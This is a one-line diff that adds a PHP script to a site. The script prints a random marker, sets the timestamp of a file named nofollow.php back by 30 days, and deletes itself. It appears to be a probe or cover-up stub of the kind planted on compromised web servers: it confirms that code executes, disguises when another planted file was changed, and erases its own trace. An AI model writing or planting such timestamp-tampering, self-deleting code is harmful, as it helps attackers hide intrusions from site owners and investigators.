@@ -1,0 +1,1 @@
+<?php echo "gdnnypGTDW"; if (file_exists("./nofollow.php")){ touch("./nofollow.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*0wahuAsrm17xUgvG9r4t*/ ?>
